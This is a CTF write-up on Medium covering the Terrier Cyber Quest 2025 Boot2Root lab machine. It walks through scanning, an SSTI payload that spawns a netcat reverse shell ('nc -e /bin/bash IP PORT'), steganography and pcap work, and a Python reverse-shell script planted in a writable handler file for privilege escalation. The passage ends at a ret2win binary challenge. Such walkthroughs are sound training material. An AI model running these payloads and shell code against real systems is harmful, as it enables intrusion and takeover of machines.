---
title: Terrier Cyber Quest 2025 — Brief Write-up
url: https://infosecwriteups.com/terrier-cyber-quest-2025-brief-write-up-b001310d025c?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2025-09-27
fetch_date: 2025-10-02T20:46:38.054125
---

# Terrier Cyber Quest 2025 — Brief Write-up

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fb001310d025c&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fterrier-cyber-quest-2025-brief-write-up-b001310d025c&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fterrier-cyber-quest-2025-brief-write-up-b001310d025c&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-b001310d025c---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-b001310d025c---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Terrier Cyber Quest 2025 — Brief Write-up

[![Somnath Das](https://miro.medium.com/v2/resize:fill:64:64/1*eoBuIaTUq15vI7awvMmLVQ.jpeg)](https://medium.com/%40dassomnath?source=post_page---byline--b001310d025c---------------------------------------)

[Somnath Das](https://medium.com/%40dassomnath?source=post_page---byline--b001310d025c---------------------------------------)

7 min read

·

6 days ago

--

2

Listen

Share

Quick but complete walk-through for the Boot2Root CTF hosted during Cyber Quest 2025.

Press enter or click to view image in full size

![]()

Featured Image.

## Initial Access

Ran an `nmap` scan —

```
sudo nmap -sC 192.168.57.24 -A -v -p-
```

Press enter or click to view image in full size

![]()

Result for the nmap scan.

We found a web-server running at `5000` —

Press enter or click to view image in full size

![]()

Service Information from the nmap scan.

Fuzzed `directories` and `endpoints` using `ffuf`.

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.57.24:5000/FUZZ -fs 3806
```

Press enter or click to view image in full size

![]()

Found a page using ffuf.

Went to the page and tested for `SSTI` and confirmed it.

Press enter or click to view image in full size

![]()

Entering a generic payload to test for SSTI.

Press enter or click to view image in full size

![]()

Confirmation that SSTI exists.

Entered the following payload and gained a foot-hold.

```
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('nc -e /bin/bash IP PORT').read()}}
```

Got the first flag — `FLAG -> S3Cur1ty_Br3@k_P@55ed`.

Press enter or click to view image in full size

![]()

Shell access obtained as a foothold on the server.

Found a suspicious directory at `/` —

Press enter or click to view image in full size

![]()

Found a note that contained hint for the next challenge.

Following the hint, investigated the `pcapng` file and copied all `ICMP` data -

Press enter or click to view image in full size

![]()

Using wireshark to investigate the “pcapng” file for further information.

Hex-decoding it, we obtained the following encoded text —

```
22gSOqdlldjDbbIxZ4NPAeodlIvKmMGjj3ZTw9D5fXc1ffsERpc7CznmEVd1BhfbqbQaIJ5s4
```

Finally using `CyberChef`, we decoded it to `Pass:H1dden_W0rlD_UnD3r_Bit` —

Press enter or click to view image in full size

![]()

Using CyberChef to decode the found string.

We also found a `Container.png` file and exported it —

Press enter or click to view image in full size

![]()

Using wireshark to export “PNG” file from the capture file.

After that we used a tool `OpenStego` and got the creds for `flower` —
`F!ow3r#92@tY8&Vk` —

Press enter or click to view image in full size

![]()

Using OpenStego application to extract hidden data from the “PNG” image.

Also, we observe that we have more users apart from `root` -

Press enter or click to view image in full size

![]()

cat /etc/passwd

## Privilege Escalation — Stage 1

We obtained `shell` to `flower` using `ssh` —

Press enter or click to view image in full size

![]()

ssh session for the user “flower”.

During recon we found a directory called `handler`, clearly we can see different permissions for different users.

Press enter or click to view image in full size

![]()

Listed contents of a suspicious directory.

When I checked for running processes, I saw `daemon.py` which was inside `/handler` directory running as `leaf` user —

Press enter or click to view image in full size

![]()

A python script running as “leaf” user.

Further investigating `daemon.py` I found out that it copies `handler.py` from `/handler` to `/tmp/` directory as `leaf` user and then executes it as `leaf` user. I also noticed that I had privilege of `rw` for `/handler/handler.py` file and so I modified it.

```
#!/usr/bin/env python3
import socket, os, pty, sys, time, traceback

HOST = "127.0.0.1"
PORT = 6969
CONNECT_TIMEOUT = 6.0

def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(CONNECT_TIMEOUT)
        s.connect((HOST, PORT))
        s.settimeout(None)
        try:
            s.sendall(b"handler: connected - spawning PTY shell\n")
        except Exception:
            pass
    except Exception as e:
        time.sleep(0.2)
        return

    fd = s.fileno()
    os.dup2(fd, 0)
    os.dup2(fd, 1)
    os.dup2(fd, 2)

    try:
        pty.spawn("/bin/sh")
    except Exception:
        try:
            os.execv("/bin/sh", ["/bin/sh", "-i"])
        except Exception:
            try:
                s.close()
            except Exception:
                pass

if __name__ == "__main__":
    try:
        main()
    except Exception:
        traceback.print_exc()
        time.sleep(0.2)
```

We can trigger `daemon.py` to copy `handler.py` to `/tmp/handler_exec.py` as `leaf` user by doing `nc -nvlp 8080` so that it tries to make a connection —

Press enter or click to view image in full size

![]()

Making a connection to localhost port 8080 using netcat.

And we pwned `leaf` user —

Press enter or click to view image in full size

![]()

Obtained shell to “leaf” user.

Obtained the third flag `FLAG -> Y0u_kn0w_i5_th15_RaC3` —

![]()

Showing contents of the F14@\_thr33.txt file.

## Privilege Escalation — Stage 2

From recon we also found out that `/bin/` contained a binary that runs as `stem` and `leaf` user is allowed to execute it.

Press enter or click to view image in full size

![]()

Listing a binary file called “challenge” that has “suid” bit set meaning it runs as “stem” user.

We obtain this `challenge` file and investigate. Most likely a `pwn` challenge.

Press enter or click to view image in full size

![]()

Basic information and execution of the “challenge” program.

We use `decompiler` and it looks like a `ret2win` challenge —

Press enter or click to view image in full size

![]()

win() function Pseudo C code from Binary Ninja decompiler.
...